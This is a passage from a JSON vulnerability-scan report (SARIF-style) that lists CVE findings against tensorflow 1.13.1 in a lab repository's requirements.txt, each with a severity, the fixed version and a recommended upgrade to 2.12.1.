            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37680 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37680)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "047305e460c8a9273fa91b2b7bd7151eb631715a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37689",
          "ruleIndex": 223,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37689 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37689](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37689)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7396345477da1594f3271f6a6047ada965b1ffc6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37673",
          "ruleIndex": 224,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37673 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37673](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37673)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "960b76c33f5a536b219082c42ea8425e63a8ec52"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37659",
          "ruleIndex": 225,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37659 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37659](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37659)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a1ddace887add40684b0a8b3feff363a0f430522"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37656",
          "ruleIndex": 226,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37656 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37656](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37656)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9a6c6fc8bef3f49646cd87c4002bfb3f58bceafe"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37684",
          "ruleIndex": 227,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37684 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37684](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37684)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "01eb055069768605194f1e03c3a7a9d893b6bafe"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37644",
          "ruleIndex": 228,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37644 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37644](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37644)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6252384da7f0f58d0e7f34d931fdc2246add49a0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37651",
          "ruleIndex": 229,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37651 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37651)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "c3a6f2df93929401869d670adb6cfa9e73aa943f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37639",
          "ruleIndex": 230,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37639 (severity: high, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37639)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5c47b1ab4c99765ecb839d66a70946e6150146a2"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37685",
          "ruleIndex": 231,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37685 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37685](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37685)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d135f24d0a0e80b44e2c02a89dd8e4246d1cafc3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15265",
          "ruleIndex": 232,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15265 (severity: high, fixed in 2.4.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15265](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15265)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8b16db301054d10c879ad80c98e28da02dd00384"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-15266",
          "ruleIndex": 233,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2020-15266 (severity: medium, fixed in 2.4.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-15266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15266)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "44e1c5dc647a507afad73acf40784a5186330c7d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-37645",
          "ruleIndex": 234,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-37645 (severity: medium, fixed in 2.5.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-37645](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37645)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3e80a5742a1cf6d5bb99ea532ddf9c3142811250"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41216",
          "ruleIndex": 235,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41216 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41216](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41216)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7447fd1cf941a0564539f1e929385d6cf355f092"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41218",
          "ruleIndex": 236,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41218 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41218](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41218)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "147e1b9ccfb40ed5eacbe5dff3c2c31cd47e6f6c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41205",
          "ruleIndex": 237,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41205 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41205](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41205)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1cabe66c1a3b698ca58c1938c6bb2228f169ff51"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41223",
          "ruleIndex": 238,
          "level": "warning",
          "message": {
